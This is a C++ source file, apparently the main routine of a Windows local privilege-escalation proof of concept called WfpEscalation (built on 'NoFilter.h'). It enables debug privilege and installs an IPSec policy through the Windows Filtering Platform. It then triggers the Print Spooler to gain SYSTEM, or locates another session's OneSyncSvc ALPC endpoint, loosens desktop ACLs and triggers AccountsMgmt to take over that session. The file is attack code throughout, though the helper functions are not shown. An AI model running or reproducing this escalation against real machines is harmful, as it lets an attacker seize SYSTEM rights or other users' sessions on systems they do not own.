#include "NoFilter.h"

void PrintHelp()
{
	wcout << L"WfpEscalation.exe [-s] [Session ID]" << endl;
}

int main()
{
	bool elevateToSystem = true;
	int argc = 0;
	LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
	DWORD sessionId = 0;
	switch (argc)
	{
	case 1:
		break;
	case 3:
		if (!wcscmp(argv[1], L"-s"))
		{
			sessionId = wcstol(argv[2], nullptr, 10);
			if (sessionId)
				elevateToSystem = false;
		}
		break;
	default:
		PrintHelp();
		return EXIT_SUCCESS;
	}

	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	try
	{
		// required to open a handle to the BFE service
		EnableDebugPrivilegeCurrentProcess();

		// Configure an IPSec policy on the localhost
		WfpClient wfpClient(sessionId);
		wfpClient.InstallIPSecPolicy(g_PolicyName, &g_ProviderGuid, g_LocalAddress, g_RemoteAddress, g_PreSharedKey);
		wcout << L"IPSec policy installed: " << wfpClient.GetIPSecPolicyGuid() << endl;

		DWORD triggerStatus = 0;
		if (elevateToSystem)
			triggerStatus = TriggerPrintSpooler(&wfpClient);
		else
		{
			// Enumerate all services and check their name and session
			DWORD pid = GetServicePidBySession(L"OneSyncSvc", sessionId);
			wcout << "OneSyncSvc pid for session " << sessionId << " is: " << pid << endl;

			// Connecting to the SyncController interface without the unique endpoint string will bind to the service running in the current session instead
			wstring endpoint = GetEndpointFromHandleTable(pid);
			wcout << "OneSyncSvc ALPC port: " << endpoint << endl;

			// Change the ACL of the windows station and the desktop to fix a problem with non-interactive CMD
			AdjustDesktop();
			triggerStatus = TriggerAccountsMgmt(&wfpClient, endpoint);
		}
		wcout << L"Trigger status: 0x" << std::hex << triggerStatus << std::dec << endl;
	}
	catch (std::exception& ex)
	{
		wcout << ex.what() << endl;
	}
	WSACleanup();
	return EXIT_SUCCESS;
}